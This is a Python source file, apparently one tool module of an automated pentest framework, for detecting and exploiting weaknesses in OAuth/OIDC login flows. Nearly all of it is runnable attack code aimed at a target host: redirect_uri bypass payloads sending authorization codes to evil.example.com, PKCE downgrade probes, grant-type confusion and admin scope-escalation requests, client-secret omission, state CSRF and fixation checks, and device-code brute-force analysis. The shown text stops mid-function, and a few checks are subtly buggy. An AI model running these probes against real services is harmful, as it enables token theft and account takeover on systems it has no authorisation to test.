"""OAuth/OIDC attack tools - detect, enumerate, and exploit OAuth flows."""

from __future__ import annotations

import base64
import hashlib
import json
import secrets
import urllib.parse
from typing import Any

from config import Config
from tool_registry import Tool
from utils import run_cmd, sanitize_subprocess_arg


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _parse_json_response(output: str) -> dict:
    """Attempt to extract and parse a JSON body from curl output."""
    # Look for the first { or [ in the output to skip HTTP headers
    for i, ch in enumerate(output):
        if ch in ("{", "["):
            try:
                return json.loads(output[i:])
            except json.JSONDecodeError:
                break
    return {}


def _curl_get(url: str, extra_headers: list[str] | None = None, timeout: int = 15) -> dict[str, Any]:
    """Issue a GET request via curl and return run_cmd result."""
    cmd = ["curl", "-s", "-i", "-L", "--max-time", str(timeout), "-k"]
    for h in (extra_headers or []):
        cmd.extend(["-H", h])
    cmd.append(url)
    return run_cmd(cmd, timeout=timeout + 5)


def _curl_post(url: str, data: str, extra_headers: list[str] | None = None, timeout: int = 15) -> dict[str, Any]:
    """Issue a POST request via curl with application/x-www-form-urlencoded body."""
    cmd = [
        "curl", "-s", "-i", "-L", "--max-time", str(timeout), "-k",
        "-X", "POST",
        "-H", "Content-Type: application/x-www-form-urlencoded",
    ]
    for h in (extra_headers or []):
        cmd.extend(["-H", h])
    cmd.extend(["-d", data, url])
    return run_cmd(cmd, timeout=timeout + 5)


def _http_status(output: str) -> str:
    """Extract the first HTTP status code from curl -i output."""
    for line in output.splitlines():
        stripped = line.strip()
        if stripped.upper().startswith("HTTP/"):
            parts = stripped.split()
            if len(parts) >= 2:
                return parts[1]
    return "unknown"


def _pkce_s256(verifier: str) -> str:
    """Compute S256 code_challenge from a verifier string."""
    digest = hashlib.sha256(verifier.encode("ascii")).digest()
    return base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")


# ---------------------------------------------------------------------------
# Core functions
# ---------------------------------------------------------------------------


def oauth_detect(target: str) -> dict[str, Any]:
    """Detect OAuth/OIDC endpoints and configuration for a target.

    Probes well-known discovery documents and common OAuth paths, then
    extracts client metadata, supported response types, and provider identity.
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target if target.startswith("http") else f"https://{target}"
    base = base.rstrip("/")

    lines: list[str] = [f"[oauth_detect] Probing {base} for OAuth/OIDC endpoints"]
    findings: dict[str, Any] = {
        "base": base,
        "discovery_doc": None,
        "auth_endpoint": "",
        "token_endpoint": "",
        "device_endpoint": "",
        "userinfo_endpoint": "",
        "supported_response_types": [],
        "provider": "unknown",
        "client_ids_found": [],
        "redirect_uris_found": [],
        "paths_found": [],
    }

    # -- Discovery documents --
    discovery_paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/.well-known/openid-connect/openid-configuration",
    ]
    for path in discovery_paths:
        url = base + path
        result = _curl_get(url, timeout=12)
        status = _http_status(result.get("stdout", ""))
        if status.startswith("2"):
            doc = _parse_json_response(result.get("stdout", ""))
            if doc and "issuer" in doc or "authorization_endpoint" in doc:
                lines.append(f"  [+] Discovery document found: {url}")
                findings["discovery_doc"] = url
                findings["auth_endpoint"] = doc.get("authorization_endpoint", "")
                findings["token_endpoint"] = doc.get("token_endpoint", "")
                findings["device_endpoint"] = doc.get("device_authorization_endpoint", "")
                findings["userinfo_endpoint"] = doc.get("userinfo_endpoint", "")
                findings["supported_response_types"] = doc.get("response_types_supported", [])
                issuer = doc.get("issuer", "")
                # Provider fingerprinting via issuer / well-known metadata
                if "okta.com" in issuer:
                    findings["provider"] = "Okta"
                elif "auth0.com" in issuer:
                    findings["provider"] = "Auth0"
                elif "cognito" in issuer or "amazonaws.com" in issuer:
                    findings["provider"] = "AWS Cognito"
                elif "login.microsoftonline.com" in issuer or "azure" in issuer.lower():
                    findings["provider"] = "Azure AD"
                elif "accounts.google.com" in issuer:
                    findings["provider"] = "Google"
                elif issuer:
                    findings["provider"] = f"custom ({issuer})"
                lines.append(f"      Provider: {findings['provider']}")
                lines.append(f"      Auth endpoint: {findings['auth_endpoint']}")
                lines.append(f"      Token endpoint: {findings['token_endpoint']}")
                if findings["supported_response_types"]:
                    lines.append(f"      Response types: {', '.join(findings['supported_response_types'])}")
                break

    # -- Common OAuth path probing --
    common_paths = [
        "/oauth/authorize",
        "/oauth/token",
        "/oauth2/authorize",
        "/oauth2/token",
        "/auth/callback",
        "/auth/authorize",
        "/login/oauth",
        "/login/oauth/authorize",
        "/connect/authorize",
        "/connect/token",
        "/openid-connect/token",
        "/protocol/openid-connect/auth",
        "/protocol/openid-connect/token",
        "/as/authorization.oauth2",
        "/as/token.oauth2",
    ]
    for path in common_paths:
        url = base + path
        result = _curl_get(url, timeout=8)
        status = _http_status(result.get("stdout", ""))
        # 200, 302, 400, 401, 405 all indicate an active endpoint (not 404)
        if status not in ("404", "unknown", ""):
            lines.append(f"  [+] Active OAuth path [{status}]: {url}")
            findings["paths_found"].append({"path": url, "status": status})
            # If auth endpoint not yet set and this looks like an authorize endpoint
            if not findings["auth_endpoint"] and "authorize" in path:
                findings["auth_endpoint"] = url
            if not findings["token_endpoint"] and "token" in path:
                findings["token_endpoint"] = url

    # -- Scrape client_id and redirect_uri from any 400 error responses --
    if findings["auth_endpoint"]:
        probe_url = findings["auth_endpoint"] + "?response_type=code"
        probe_result = _curl_get(probe_url, timeout=10)
        body = probe_result.get("stdout", "")
        # Look for client_id hints in the error response
        import re
        cids = re.findall(r'["\']?client_id["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-\.]{8,64})', body)
        ruris = re.findall(r'redirect_uri["\']?\s*[:=]\s*["\']?(https?://[^\s\'"<>]+)', body)
        findings["client_ids_found"] = list(set(cids))
        findings["redirect_uris_found"] = list(set(ruris))
        if cids:
            lines.append(f"  [+] client_id hints found: {cids[:3]}")
        if ruris:
            lines.append(f"  [+] redirect_uri hints found: {ruris[:3]}")

    if not findings["paths_found"] and not findings["discovery_doc"]:
        lines.append("  [-] No OAuth endpoints detected")

    return {
        "stdout": "\n".join(lines),
        "stderr": "",
        "returncode": 0,
        "parsed": findings,
    }


def oauth_redirect_test(
    target: str,
    client_id: str = "",
    redirect_uri: str = "",
) -> dict[str, Any]:
    """Test redirect_uri manipulation attacks on an OAuth authorization endpoint.

    Tries open redirect via path traversal, subdomain bypass, parameter injection,
    fragment injection, URL encoding bypass, null byte, localhost substitution,
    and double URL encoding.
    """
    target = sanitize_subprocess_arg(target, "url")
    client_id = sanitize_subprocess_arg(client_id, "generic")
    base = target if target.startswith("http") else f"https://{target}"
    base = base.rstrip("/")

    # Determine authorization endpoint
    auth_ep = base
    if not any(p in base for p in ("/oauth", "/auth", "/authorize", "/connect")):
        auth_ep = base + "/oauth/authorize"

    lines: list[str] = [
        f"[oauth_redirect_test] Testing redirect_uri manipulation on {auth_ep}",
    ]

    # Use a plausible legitimate redirect if none provided
    if not redirect_uri:
        from urllib.parse import urlparse
        domain = urlparse(base).netloc
        redirect_uri = f"https://{domain}/callback"

    safe_uri = redirect_uri.rstrip("/")
    from urllib.parse import urlparse
    parsed_redir = urlparse(safe_uri)
    legit_domain = parsed_redir.netloc

    payloads: list[dict[str, str]] = [
        {
            "name": "path_traversal",
            "uri": f"https://{legit_domain}/../evil.example.com",
            "desc": "Path traversal to escape the registered domain",
        },
        {
            "name": "subdomain_prefix",
            "uri": f"https://evil.{legit_domain}",
            "desc": "Subdomain prefix bypass (suffix matching bug)",
        },
        {
            "name": "parameter_injection",
            "uri": f"{safe_uri}?redirect=https://evil.example.com",
            "desc": "Open redirect via appended query parameter",
        },
        {
            "name": "fragment_injection",
            "uri": f"{safe_uri}#@evil.example.com",
            "desc": "Fragment with @-sign to confuse URI parsers",
        },
        {
            "name": "url_encoding_at",
            "uri": f"https://evil.example.com%40{legit_domain}",
            "desc": "URL-encoded @ to spoof host as userinfo",
        },
        {
            "name": "double_encoding",
            "uri": f"https://evil.example.com%2540{legit_domain}",
            "desc": "Double URL-encoded @ bypass",
        },
        {
            "name": "null_byte",
            "uri": f"{safe_uri}%00.evil.example.com",
            "desc": "Null byte injection to truncate domain matching",
        },
        {
            "name": "localhost_sub",
            "uri": "http://localhost/callback",
            "desc": "localhost substitution - may bypass IP whitelist checks",
        },
        {
            "name": "loopback_ip",
            "uri": "http://127.0.0.1/callback",
            "desc": "Loopback IP substitution",
        },
        {
            "name": "scheme_mismatch",
            "uri": f"http://{legit_domain}/callback",
            "desc": "HTTP downgrade of registered HTTPS redirect URI",
        },
        {
            "name": "port_injection",
            "uri": f"https://{legit_domain}:8080/callback",
            "desc": "Non-standard port to bypass exact-match validation",
        },
        {
            "name": "case_variation",
            "uri": safe_uri.upper(),
            "desc": "Uppercase URI - tests case-sensitive matching",
        },
        {
            "name": "wildcard_dot",
            "uri": f"https://.{legit_domain}/callback",
            "desc": "Leading dot - some parsers treat as wildcard prefix",
        },
    ]

    results: list[dict[str, Any]] = []
    cid_param = f"&client_id={urllib.parse.quote(client_id)}" if client_id else ""

    for p in payloads:
        encoded_uri = urllib.parse.quote(p["uri"], safe="")
        url = f"{auth_ep}?response_type=code{cid_param}&redirect_uri={encoded_uri}&state=teststate"
        result = _curl_get(url, timeout=10)
        status = _http_status(result.get("stdout", ""))
        body = result.get("stdout", "")

        # A 302 to the evil domain or a 200 that echoes the evil URI back indicates acceptance
        accepted = False
        location = ""
        for line in body.splitlines():
            if line.lower().startswith("location:"):
                location = line.split(":", 1)[1].strip()
                break

        evil_domain = "evil.example.com"
        if evil_domain in location or (status.startswith("2") and evil_domain in body):
            accepted = True
        # localhost/loopback checks
        if p["name"] in ("localhost_sub", "loopback_ip") and (
            "localhost" in location or "127.0.0.1" in location
        ):
            accepted = True

        tag = "ACCEPTED" if accepted else f"rejected ({status})"
        lines.append(f"  [{tag}] {p['name']}: {p['desc']}")
        if location:
            lines.append(f"           Location: {location[:120]}")
        results.append({
            "name": p["name"],
            "payload_uri": p["uri"],
            "description": p["desc"],
            "http_status": status,
            "location_header": location,
            "accepted": accepted,
        })

    accepted_count = sum(1 for r in results if r["accepted"])
    lines.append(f"\n  Summary: {accepted_count}/{len(payloads)} redirect_uri payloads accepted")

    return {
        "stdout": "\n".join(lines),
        "stderr": "",
        "returncode": 0,
        "parsed": {
            "auth_endpoint": auth_ep,
            "tested_base_uri": safe_uri,
            "results": results,
            "accepted_count": accepted_count,
        },
    }


def oauth_pkce_test(
    target: str,
    auth_endpoint: str = "",
    token_endpoint: str = "",
) -> dict[str, Any]:
    """Test for PKCE downgrade and weakness vulnerabilities.

    Checks whether the server rejects flows without code_challenge, accepts
    the weaker 'plain' method instead of S256, and whether code_verifier reuse
    across sessions is permitted (CVE-2024-23647 pattern).
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target if target.startswith("http") else f"https://{target}"
    base = base.rstrip("/")

    if not auth_endpoint:
        auth_endpoint = base + "/oauth/authorize"
    if not token_endpoint:
        token_endpoint = base + "/oauth/token"

    lines: list[str] = [f"[oauth_pkce_test] Testing PKCE enforcement on {auth_endpoint}"]
    results: list[dict[str, Any]] = []

    # -- Test 1: Authorization request with no code_challenge --
    state = secrets.token_urlsafe(16)
    url_no_pkce = (
        f"{auth_endpoint}?response_type=code"
        f"&client_id=test_client"
        f"&redirect_uri=https://localhost/callback"
        f"&state={state}"
    )
    r = _curl_get(url_no_pkce, timeout=10)
    status = _http_status(r.get("stdout", ""))
    body = r.get("stdout", "")

    # A server enforcing PKCE should return 400 or redirect with error=invalid_request
    enforced = status in ("400", "401") or "invalid_request" in body.lower() or "code_challenge" in body.lower()
    tag = "ENFORCED" if enforced else "NOT ENFORCED - PKCE OPTIONAL (VULNERABLE)"
    lines.append(f"  Test 1 - No code_challenge: [{tag}] (HTTP {status})")
    results.append({
        "test": "no_code_challenge",
        "description": "Authorization request without code_challenge parameter",
        "status": status,
        "pkce_enforced": enforced,
        "vulnerable": not enforced,
    })

    # -- Test 2: plain method instead of S256 --
    verifier = secrets.token_urlsafe(43)
    challenge_plain = verifier  # plain = verifier itself
    url_plain = (
        f"{auth_endpoint}?response_type=code"
        f"&client_id=test_client"
        f"&redirect_uri=https://localhost/callback"
        f"&state={secrets.token_urlsafe(16)}"
        f"&code_challenge={urllib.parse.quote(challenge_plain)}"
        f"&code_challenge_method=plain"
    )
    r2 = _curl_get(url_plain, timeout=10)
    status2 = _http_status(r2.get("stdout", ""))
    body2 = r2.get("stdout", "")

    plain_rejected = status2 in ("400", "401") or "plain" in body2.lower() and "not" in body2.lower()
    tag2 = "REJECTED" if plain_rejected else "ACCEPTED - plain method allowed (weaker security)"
    lines.append(f"  Test 2 - code_challenge_method=plain: [{tag2}] (HTTP {status2})")
    results.append({
        "test": "plain_method",
        "description": "Authorization request with code_challenge_method=plain (weaker than S256)",
        "status": status2,
        "plain_accepted": not plain_rejected,
        "vulnerable": not plain_rejected,
    })

    # -- Test 3: S256 challenge with mismatched verifier on token exchange --
    verifier_a = secrets.token_urlsafe(43)
    verifier_b = secrets.token_urlsafe(43)  # Different verifier
    challenge_a = _pkce_s256(verifier_a)

    lines.append(f"  Test 3 - Mismatched code_verifier on token exchange (S256)")
    lines.append(f"           code_challenge generated from verifier_a, token request uses verifier_b")
    # We can only complete this test if we get an auth code - probe the token endpoint
    # with a fake code and mismatched verifier to check error messaging
    token_data = (
        f"grant_type=authorization_code"
        f"&code=fake_auth_code_12345"
        f"&redirect_uri={urllib.parse.quote('https://localhost/callback')}"
        f"&client_id=test_client"
        f"&code_verifier={verifier_b}"
    )
    r3 = _curl_post(token_endpoint, token_data, timeout=10)
    status3 = _http_status(r3.get("stdout", ""))
    body3 = r3.get("stdout", "")
    doc3 = _parse_json_response(body3)
    err3 = doc3.get("error", "")
    lines.append(f"           Token endpoint response: HTTP {status3}, error={err3!r}")
    results.append({
        "test": "mismatched_verifier",
        "description": "Token exchange with mismatched code_verifier (different from challenge)",
        "status": status3,
        "error": err3,
        "note": "Expected: invalid_grant or invalid_request. If 200, PKCE not verified at token exchange.",
    })

    # -- Test 4: Code verifier reuse (CVE-2024-23647 pattern) --
    # Attempt to use the same code_verifier in a second token request
    # This probes whether the server invalidates the verifier after first use
    lines.append(f"  Test 4 - CVE-2024-23647 pattern: removing code_challenge reverts to injectable flow")
    lines.append(f"           Sending authorization request without code_challenge after prior PKCE session")
    url_no_challenge_reuse = (
        f"{auth_endpoint}?response_type=code"
        f"&client_id=test_client"
        f"&redirect_uri=https://localhost/callback"
        f"&state={secrets.token_urlsafe(16)}"
        # Intentionally omit code_challenge to test if server falls back to no-PKCE flow
    )
    r4 = _curl_get(url_no_challenge_reuse, timeout=10)
    status4 = _http_status(r4.get("stdout", ""))
    body4 = r4.get("stdout", "")
    code_in_redirect = False
    for line in body4.splitlines():
        if line.lower().startswith("location:") and "code=" in line.lower():
            code_in_redirect = True
            break

    tag4 = "CODE ISSUED WITHOUT PKCE (VULNERABLE)" if code_in_redirect else f"No code issued (HTTP {status4})"
    lines.append(f"           Result: [{tag4}]")
    results.append({
        "test": "cve_2024_23647_pattern",
        "description": "Omit code_challenge after PKCE-capable client to test fallback to non-PKCE flow",
        "status": status4,
        "code_issued_without_pkce": code_in_redirect,
        "vulnerable": code_in_redirect,
    })

    vulnerable_count = sum(1 for r in results if r.get("vulnerable"))
    lines.append(f"\n  Summary: {vulnerable_count}/{len(results)} PKCE tests indicate vulnerabilities")

    return {
        "stdout": "\n".join(lines),
        "stderr": "",
        "returncode": 0,
        "parsed": {
            "auth_endpoint": auth_endpoint,
            "token_endpoint": token_endpoint,
            "results": results,
            "vulnerable_count": vulnerable_count,
        },
    }


def oauth_token_test(
    target: str,
    token_endpoint: str = "",
) -> dict[str, Any]:
    """Test OAuth token endpoint for grant type confusion, scope escalation,
    refresh token abuse, and client authentication bypass.
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target if target.startswith("http") else f"https://{target}"
    base = base.rstrip("/")

    if not token_endpoint:
        token_endpoint = base + "/oauth/token"

    lines: list[str] = [f"[oauth_token_test] Probing token endpoint: {token_endpoint}"]
    results: list[dict[str, Any]] = []

    # -- Test 1: Grant type confusion - switch authorization_code to client_credentials --
    lines.append("  Test 1 - Grant type confusion: authorization_code -> client_credentials")
    data1 = (
        "grant_type=client_credentials"
        "&client_id=test_client"
        "&scope=openid+profile+email+admin"
    )
    r1 = _curl_post(token_endpoint, data1, timeout=12)
    status1 = _http_status(r1.get("stdout", ""))
    body1 = r1.get("stdout", "")
    doc1 = _parse_json_response(body1)
    token_issued = "access_token" in doc1
    lines.append(f"           HTTP {status1} | token_issued={token_issued} | error={doc1.get('error', 'none')!r}")
    results.append({
        "test": "grant_type_confusion",
        "payload": data1,
        "status": status1,
        "access_token_issued": token_issued,
        "vulnerable": token_issued,
        "description": "Attempt client_credentials grant with no client secret to obtain token",
    })

    # -- Test 2: Token exchange manipulation (RFC 8693) --
    lines.append("  Test 2 - Token exchange manipulation (RFC 8693)")
    data2 = (
        "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange"
        "&subject_token=fake_access_token"
        "&subject_token_type=urn%3Aietf%3Aparams%3Aoauth%3Atoken-type%3Aaccess_token"
        "&requested_token_type=urn%3Aietf%3Aparams%3Aoauth%3Atoken-type%3Aaccess_token"
        "&scope=admin+openid"
        "&client_id=test_client"
    )
    r2 = _curl_post(token_endpoint, data2, timeout=12)
    status2 = _http_status(r2.get("stdout", ""))
    body2 = r2.get("stdout", "")
    doc2 = _parse_json_response(body2)
    token_issued2 = "access_token" in doc2
    supported = status2 not in ("404", "unknown") and "unsupported_grant_type" not in doc2.get("error", "")
    lines.append(f"           HTTP {status2} | token_issued={token_issued2} | exchange_supported={supported}")
    results.append({
        "test": "token_exchange_rfc8693",
        "status": status2,
        "access_token_issued": token_issued2,
        "exchange_supported": supported,
        "vulnerable": token_issued2,
        "description": "RFC 8693 token exchange with fake subject_token and elevated scope",
    })

    # -- Test 3: Refresh token scope escalation --
    lines.append("  Test 3 - Refresh token scope escalation")
    data3 = (
        "grant_type=refresh_token"
        "&refresh_token=fake_refresh_token_abc123"
        "&client_id=test_client"
        "&scope=admin+openid+profile+email+write+delete"
    )
    r3 = _curl_post(token_endpoint, data3, timeout=12)
    status3 = _http_status(r3.get("stdout", ""))
    body3 = r3.get("stdout", "")
    doc3 = _parse_json_response(body3)
    err3 = doc3.get("error", "")
    # If error is not invalid_client/invalid_grant about the token itself,
    # but rather succeeds or mentions scope, that is suspicious
    scope_escalated = "access_token" in doc3
    lines.append(f"           HTTP {status3} | access_token_issued={scope_escalated} | error={err3!r}")
    results.append({
        "test": "refresh_scope_escalation",
        "payload_scope": "admin openid profile email write delete",
        "status": status3,
        "access_token_issued": scope_escalated,
        "vulnerable": scope_escalated,
        "description": "Attempt to escalate scope on refresh token exchange",
    })

    # -- Test 4: Client authentication bypass - remove client_secret --
    lines.append("  Test 4 - Client authentication bypass: omit client_secret")
    data4 = (
        "grant_type=authorization_code"
        "&code=fake_auth_code_test_bypass"
        "&redirect_uri=https://localhost/callback"
        "&client_id=test_client"
        # Intentionally omit client_secret
    )
    r4 = _curl_post(token_endpoint, data4, timeout=12)
    status4 = _http_status(r4.get("stdout", ""))
    body4 = r4.get("stdout", "")
    doc4 = _parse_json_response(body4)
    err4 = doc4.get("error", "")
    # If the error is about the code (invalid_grant) rather than missing client auth,
    # the endpoint accepted the request without client auth
    secret_bypass = err4 == "invalid_grant" or "access_token" in doc4
    lines.append(f"           HTTP {status4} | error={err4!r} | possible_bypass={secret_bypass}")
    results.append({
        "test": "client_auth_bypass_no_secret",
        "status": status4,
        "error": err4,
        "possible_client_auth_bypass": secret_bypass,
        "vulnerable": secret_bypass,
        "description": "Authorization code exchange without client_secret - server should require it",
    })

    # -- Test 5: Public client implicit flow attempt --
    lines.append("  Test 5 - Implicit grant type (deprecated, should be disabled)")
    data5 = (
        "grant_type=implicit"
        "&client_id=test_client"
        "&scope=openid+profile"
        "&redirect_uri=https://localhost/callback"
    )
    r5 = _curl_post(token_endpoint, data5, timeout=12)
    status5 = _http_status(r5.get("stdout", ""))
    doc5 = _parse_json_response(r5.get("stdout", ""))
    implicit_allowed = "access_token" in doc5 or (
        status5 not in ("400", "401", "404", "unknown") and "unsupported_grant_type" not in doc5.get("error", "")
    )
    lines.append(f"           HTTP {status5} | implicit_flow_present={implicit_allowed}")
    results.append({
        "test": "implicit_grant",
        "status": status5,
        "implicit_allowed": implicit_allowed,
        "vulnerable": implicit_allowed,
        "description": "Implicit grant type is deprecated and should be disabled",
    })

    vulnerable_count = sum(1 for r in results if r.get("vulnerable"))
    lines.append(f"\n  Summary: {vulnerable_count}/{len(results)} token endpoint tests indicate vulnerabilities")

    return {
        "stdout": "\n".join(lines),
        "stderr": "",
        "returncode": 0,
        "parsed": {
            "token_endpoint": token_endpoint,
            "results": results,
            "vulnerable_count": vulnerable_count,
        },
    }


def oauth_state_test(
    target: str,
    auth_endpoint: str = "",
) -> dict[str, Any]:
    """Test OAuth state parameter handling for CSRF vulnerabilities.

    Checks whether the state parameter is required, whether predictable values
    are accepted, and probes for state fixation possibilities.
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target if target.startswith("http") else f"https://{target}"
    base = base.rstrip("/")

    if not auth_endpoint:
        auth_endpoint = base + "/oauth/authorize"

    lines: list[str] = [f"[oauth_state_test] Testing state parameter handling on {auth_endpoint}"]
    results: list[dict[str, Any]] = []

    base_params = "response_type=code&client_id=test_client&redirect_uri=https://localhost/callback"

    # -- Test 1: Missing state parameter --
    lines.append("  Test 1 - Missing state parameter (CSRF on OAuth flow)")
    url_no_state = f"{auth_endpoint}?{base_params}"
    r1 = _curl_get(url_no_state, timeout=10)
    status1 = _http_status(r1.get("stdout", ""))
    body1 = r1.get("stdout", "")

    state_required = status1 in ("400", "401") or "state" in body1.lower() and (
        "required" in body1.lower() or "missing" in body1.lower()
    )
    # Check if a redirect was issued without state - that means the flow proceeds
    location1 = ""
    for line in body1.splitlines():
        if line.lower().startswith("location:"):
            location1 = line.split(":", 1)[1].strip()
            break
    flow_proceeds = status1 in ("200", "302") or bool(location1)

    tag1 = "REQUIRED (secure)" if state_required else "NOT REQUIRED - CSRF possible"
    lines.append(f"           HTTP {status1} | [{tag1}] | location={location1[:80]!r}")
    results.append({
        "test": "missing_state",
        "status": status1,
        "state_required": state_required,
        "flow_proceeds_without_state": flow_proceeds,
        "vulnerable": not state_required and flow_proceeds,
        "description": "Missing state parameter should cause a 400 error if CSRF protection enforced",
    })

    # -- Test 2: Predictable state values --
    lines.append("  Test 2 - Predictable/static state values")
    predictable_states = ["1", "0", "state", "csrf", "12345", "null", "undefined", "true"]
    predictable_accepted: list[str] = []
    for sv in predictable_states:
        url_pred = f"{auth_endpoint}?{base_params}&state={sv}"
        rp = _curl_get(url_pred, timeout=8)
        sp = _http_status(rp.get("stdout", ""))
        bp = rp.get("stdout", "")
        loc_p = ""
        for line in bp.splitlines():
            if line.lower().startswith("location:"):
                loc_p = line.split(":", 1)[1].strip()
                break
        if sp in ("200", "302") or loc_p:
            predictable_accepted.append(sv)

    if predictable_accepted:
        lines.append(f"           Predictable states accepted: {predictable_accepted}")
    else:
        lines.append(f"           All predictable state values rejected or unevaluable")
    results.append({
        "test": "predictable_state",
        "states_tested": predictable_states,
        "states_accepted": predictable_accepted,
        "vulnerable": len(predictable_accepted) > 0,
        "description": "Predictable state values accepted (reduces CSRF protection entropy)",
    })

    # -- Test 3: State fixation --
    lines.append("  Test 3 - State fixation: attacker-supplied state echoed back in redirect")
    fixation_state = "ATTACKER_FIXED_STATE_XYZ123"
    url_fix = f"{auth_endpoint}?{base_params}&state={fixation_state}"
    r3 = _curl_get(url_fix, timeout=10)
    body3 = r3.get("stdout", "")
    status3 = _http_status(body3)
    location3 = ""
    for line in body3.splitlines():
        if line.lower().startswith("location:"):
            location3 = line.split(":", 1)[1].strip()
            break

    state_echoed = fixation_state in location3
    tag3 = "STATE ECHOED IN REDIRECT (fixation possible)" if state_echoed else "State not directly echoed"
    lines.append(f"           HTTP {status3} | [{tag3}]")
    if location3:
        lines.append(f"           Location: {location3[:120]}")
    results.append({
        "test": "state_fixation",
        "fixed_state": fixation_state,
        "status": status3,
        "state_echoed_in_redirect": state_echoed,
        "location": location3,
        "vulnerable": state_echoed,
        "description": "If attacker-supplied state is echoed back, state fixation may be possible",
    })

    # -- Test 4: Empty state --
    lines.append("  Test 4 - Empty state value")
    url_empty = f"{auth_endpoint}?{base_params}&state="
    r4 = _curl_get(url_empty, timeout=8)
    status4 = _http_status(r4.get("stdout", ""))
    body4 = r4.get("stdout", "")
    empty_ok = status4 in ("200", "302")
    lines.append(f"           HTTP {status4} | empty_state_accepted={empty_ok}")
    results.append({
        "test": "empty_state",
        "status": status4,
        "empty_state_accepted": empty_ok,
        "vulnerable": empty_ok,
        "description": "Empty state value should be rejected - provides no CSRF protection",
    })

    vulnerable_count = sum(1 for r in results if r.get("vulnerable"))
    lines.append(f"\n  Summary: {vulnerable_count}/{len(results)} state parameter tests indicate vulnerabilities")

    return {
        "stdout": "\n".join(lines),
        "stderr": "",
        "returncode": 0,
        "parsed": {
            "auth_endpoint": auth_endpoint,
            "results": results,
            "vulnerable_count": vulnerable_count,
        },
    }


def oauth_device_code(
    target: str,
    device_endpoint: str = "",
) -> dict[str, Any]:
    """Test OAuth device authorization flow for phishing vectors, polling bypass,
    and user code brute force feasibility.
    """
    target = sanitize_subprocess_arg(target, "url")
    base = target if target.startswith("http") else f"https://{target}"
    base = base.rstrip("/")

    if not device_endpoint:
        # Try common device authorization paths
        device_endpoint = base + "/oauth/device/code"

    lines: list[str] = [f"[oauth_device_code] Testing device code flow on {device_endpoint}"]
    results: list[dict[str, Any]] = []

    # -- Step 1: Initiate device code flow --
    lines.append("  Step 1 - Initiate device code flow")
    data_init = "client_id=test_client&scope=openid+profile+email"
    r_init = _curl_post(device_endpoint, data_init, timeout=15)
    status_init = _http_status(r_init.get("stdout", ""))
    body_init = r_init.get("stdout", "")
    doc_init = _parse_json_response(body_init)

    device_supported = status_init not in ("404", "unknown") and "unsupported_grant_type" not in doc_init.get("error", "")
    device_code = doc_init.get("device_code", "")
    user_code = doc_init.get("user_code", "")
    verification_uri = doc_init.get("verification_uri", "")
    expires_in = doc_init.get("expires_in", 0)
    interval = doc_init.get("interval", 5)

    lines.append(f"           HTTP {status_init} | flow_supported={device_supported}")
    if not device_supported:
        lines.append("  [-] Device code flow not supported on this endpoint")
        lines.append("       Try: /.well-known/openid-configuration -> device_authorization_endpoint")
        return {
            "stdout": "\n".join(lines),
            "stderr": "",
            "returncode": 0,
            "parsed": {"device_supported": False, "results": []},
        }

    lines.append(f"           user_code={user_code!r} | expires_in={expires_in}s | poll_interval={interval}s")
    if verification_uri:
        lines.append(f"           verification_uri={verification_uri}")

    # -- Test 2: User code brute force feasibility --
    lines.append("  Test 2 - User code brute force feasibility analysis")
    brute_force_feasible = False
    brute_force_notes: list[str] = []

    if user_code:
        # Analyze character space and length
        import re
        alpha_only = bool(re.match(r'^[A-Z\-]+$', user_code))
        alphanum = bool(re.match(r'^[A-Z0-9\-]+$', user_code))
        code_clean = user_code.replace("-", "")
        code_len = len(code_clean)

        if alpha_only and code_len <= 8:
            # 26^8 = ~208 billion, but if only 6 chars: 26^6 = ~308 million
            if code_len <= 6:
                brute_force_feasible = True
                brute_force_notes.append(f"Short alpha-only code ({code_len} chars, 26^{code_len} space) - brute forceable")
            else:
                brute_force_notes.append(f"Alpha code ({code_len} chars, 26^{code_len} space) - brute force is slow")
        elif alphanum and code_len <= 6:
            brute_force_feasible = True
            brute_force_notes.append(f"Short alphanumeric code ({code_len} chars, 36^{code_len} space) - brute forceable")
        else:
            brute_force_notes.append(f"Code format: len={code_len}, space appears sufficient")

        # Check rate limiting by sending two bad polls rapidly
        if doc_init.get("verification_uri_complete"):
            brute_force_notes.append(f"verification_uri_complete present - enables direct brute force without UI interaction")

    lines.append(f"           brute_force_feasible={brute_force_feasible}")
    for note in brute_force_notes:
        lines.append(f"           {note}")

    results.append({
        "test": "user_code_brute_force",
        "user_code": user_code,
        "expires_in": expires_in,
        "brute_force_feasible": brute_force_feasible,
        "notes": brute_force_notes,
        "vulnerable": brute_force_feasible,
        "description": "Assess whether user code space is small enough for offline/online brute force",
    })

    # -- Test 3: Polling interval bypass --
    lines.append("  Test 3 - Polling interval bypass (ignore interval, poll rapidly)")
    if device_code:
        token_ep = base + "/oauth/token"
        # Attempt to poll faster than the specified interval - check for rate limiting
        poll_data = (
            f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Adevice_code"
            f"&device_code={urllib.parse.quote(device_code)}"
            f"&client_id=test_client"
        )
        r_poll1 = _curl_post(token_ep, poll_data, timeout=10)
        r_poll2 = _curl_post(token_ep, poll_data, timeout=10)

        doc_p1 = _parse_json_response(r_poll1.get("stdout", ""))
        doc_p2 = _parse_json_response(r_poll2.get("stdout", ""))
        err_p1 = doc_p1.get("error", "")
        err_p2 = doc_p2.get("error", "")

        # RFC 8628: rapid polling should return 'slow_down' error
        slow_down_enforced = err_p1 == "slow_down" or err_p2 == "slow_down"
        rate_limited = err_p1 == "too_many_requests" or err_p2 == "too_many_requests"

        tag3 = "RATE LIMITED" if (slow_down_enforced or rate_limited) else "NO RATE LIMIT on polling (interval bypass possible)"
        lines.append(f"           Poll 1 error={err_p1!r} | Poll 2 error={err_p2!r}")
        lines.append(f"           [{tag3}]")
        results.append({
            "test": "polling_interval_bypass",
            "poll1_error": err_p1,
            "poll2_error": err_p2,
            "slow_down_enforced": slow_down_enforced,
            "rate_limited": rate_limited,
            "vulnerable": not slow_down_enforced and not rate_limited,
            "description": "Rapid polling without respecting interval - should trigger slow_down error",
        })
    else:
